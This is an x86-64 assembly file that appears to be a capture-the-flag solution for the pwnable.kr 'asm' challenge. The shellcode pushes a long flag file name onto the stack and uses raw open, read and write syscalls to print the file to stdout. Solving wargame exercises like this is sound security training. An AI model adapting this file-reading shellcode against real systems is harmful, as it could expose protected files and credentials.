.intel_syntax noprefix

# syscall numbers:
# /usr/include/x86_64-linux-gnu/asm/unistd_64.h


.global read_write_file

# this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
# length of above filename is 231 bytes 


read_write_file:
push    rbp
mov     rbp, rsp
sub     rsp, 512    # create space for filename
and     rsp, 0xfffffffffffffff0
mov     rdx, rsp
# copy "/home/asm_pwn///////"
#movabs     rax, 0x73612f656d6f682f
#movabs     rax, 0x7265672f706d742f  # /tmp/ger
#movabs     rax, 0x6f6a2f656d6f682f /home/jo
#movabs     rax, 0x65722f656d6f682f   # /home/re
#mov        qword ptr [rdx], rax
#movabs     rax, 0x2f2f2f6e77705f6d
#movabs     rax, 0x2f2f2f2f2f2f2f69  # i/////
#movabs     rax, 0x2f2f2f2f2f69737a  zsi///
#movabs     rax, 0x2f2f2f2f78756e6d   # mnux////
#mov        qword ptr [rdx+8], rax
#add        rdx, 16
# now comes the file name
movabs     rax,  0x5f73695f73696874
mov        qword ptr [rdx+0], rax
movabs     rax,  0x2e656c62616e7770
mov        qword ptr [rdx+8], rax
movabs     rax, 0x5f67616c665f726b 
mov        qword ptr [rdx+16], rax
movabs     rax, 0x656c705f656c6966 
mov        qword ptr [rdx+24], rax
movabs     rax, 0x646165725f657361 
mov        qword ptr [rdx+32], rax
movabs     rax, 0x69665f736968745f 
mov        qword ptr [rdx+40], rax
movabs     rax, 0x7972726f732e656c 
mov        qword ptr [rdx+48], rax
movabs     rax, 0x6c69665f6568745f
mov        qword ptr [rdx+56], rax
movabs     rax, 0x695f656d616e5f65
mov        qword ptr [rdx+64], rax
movabs     rax, 0x6c5f797265765f73
mov        qword ptr [rdx+72], rax
add        rdx, 80
# need to mov the below word 9 times
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        [rdx], rax
add        rdx, 8
movabs     rax, 0x303030306f6f6f6f
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x3030303030303030
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x3030303030303030
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f3030303030
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x6f6f6f6f6f6f6f6f
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x303030306f6f6f6f
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x3030303030303030
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x306f306f306f306f
mov        qword ptr [rdx], rax
add        rdx, 8
movabs     rax, 0x00676e6f306f306f
mov        qword ptr [rdx], rax
add        rdx, 8

#movabs    rax, 0x00000000000a7325
#mov       qword ptr [rdx], rax

# now the filename has been copied to the stack
# time to do an open syscall syscall number: 2
xor        rax, rax      # clear it
mov        rsi, rax      # move 0 into flags
mov        al, 2  
mov        rdi, rsp
syscall

# now read the contents of the file (syscall num 0)
mov        r9, rax     # save the file HANDLE
xor        rax, rax     # clear
sub        rsp, 256     # allocate space for the buffer
mov        rdi, r9
mov        rsi, rsp
mov        rdx, 256
syscall

# now write the contents (syscall num 1)
mov        r9, rax
xor        rax, rax
mov        al, 1        # syscall num
mov        rdi, 1       # file handle (stdout)
mov        rsi, rsp     # buffer to write to
mov        rdx, r9      # num of bytes to write
syscall
# call pause syscall
xor        rax, rax
mov        al, 34  
syscall
mov         rsp, rbp
pop         rbp
ret
 

